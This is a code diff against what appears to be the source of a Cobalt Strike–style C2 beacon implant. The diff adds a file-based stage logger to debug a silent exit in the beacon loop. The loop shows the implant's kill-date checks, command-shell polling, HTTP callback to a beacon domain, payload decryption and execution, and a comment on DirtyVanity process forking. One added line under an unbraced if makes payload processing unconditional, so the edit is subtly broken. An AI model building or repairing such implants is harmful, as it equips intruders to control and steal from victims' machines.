@@ -83,7 +83,21 @@ unsigned int genagentid() {
 	return bigger_rand() & 0x7FFFFFFF & ~1;
 }
 
+
+/* ---- BW_DIAG: 阶段标记器（Phase 2 活体诊断，定位 silent-exit 死点） ---- */
+static void bw_diag(const char *stage, long v) {
+	HANDLE h = CreateFileA("C:\\lab\\diag.txt", GENERIC_WRITE, FILE_SHARE_READ,
+		NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (h == INVALID_HANDLE_VALUE) return;
+	SetFilePointer(h, 0, NULL, FILE_END);
+	char buf[96];
+	int n = _snprintf(buf, sizeof(buf), "[%u] %s %ld\r\n", GetTickCount(), stage, v);
+	DWORD w; WriteFile(h, buf, n, &w, NULL);
+	CloseHandle(h);
+}
+
 void beacon(LPVOID lpReserved) {
+	bw_diag("enter", 0);
 	/* 4.12 DirtyVanity: fork the pristine nursery clone before ANY
 	 * RPC-capable subsystem (wininet et al) is touched - a later fork
 	 * inherits poisoned runtime state and the payload beacon fastfails
@@ -138,6 +152,7 @@ void beacon(LPVOID lpReserved) {
 	track_memory_add(blob, sizeof(datap), TRACK_MEMORY_CLEANUP_FUNC, FALSE, reinterpret_cast<void (*)(void*)>(data_free));
 	track_memory_add(blob->original, blob->size, TRACK_MEMORY_CLEANUP_FUNC, TRUE, NULL);
 
+	bw_diag("gates", 1);
 	/* 检查终止日期 */
 	if (check_kill_date())
 		safe_exit();
@@ -213,8 +228,10 @@ void beacon(LPVOID lpReserved) {
 			psh_poll(command_shell_callback, MAX_PACKET);
 			if (check_kill_date())
 				command_die(command_shell_callback);
-			length = udc2_cycle(buffer, MAX_GET);
+			bw_diag("udc2_cycle", beacon_cycles);
+		length = udc2_cycle(buffer, MAX_GET);
 			if (length > 0)
+				bw_diag("proc", length);
 				process_payload(buffer, length);
 			if (check_kill_date())
 				safe_exit();
@@ -229,6 +246,7 @@ void beacon(LPVOID lpReserved) {
 		/* 创建URL */
 		_snprintf(post_url, 256, "%s", submit);
 
+		bw_diag("pre_http", beacon_cycles);
 		/* 执行协议的HTTP部分 */
 		// dlog("beacon.beacon - http_init: %s \n", beacon_domain);
 		http_init(beacon_domain, port, ua);
@@ -243,6 +261,7 @@ void beacon(LPVOID lpReserved) {
 			length = security_decrypt(buffer, length);
 			if (length > 0) {
 				// dlog("beacon.beacon - Response decrypted length: %d \n", length);
+				bw_diag("proc", length);
 				process_payload(buffer, length);
 			} else {
 			    // CS-327: We were unable to decrypt/process the payload...
